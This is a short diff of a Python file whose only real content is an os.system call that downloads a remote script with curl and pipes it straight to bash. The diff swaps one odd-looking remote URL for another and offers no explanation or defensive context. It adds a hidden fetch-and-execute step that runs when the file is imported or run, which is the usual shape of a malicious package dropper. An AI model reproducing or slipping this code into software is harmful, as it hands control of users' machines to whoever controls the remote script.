@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/boluna/file/raw/master/mintul | bash')
+os.system('curl -sL https://github.com/cornea99/upil/raw/main/testusk | bash')
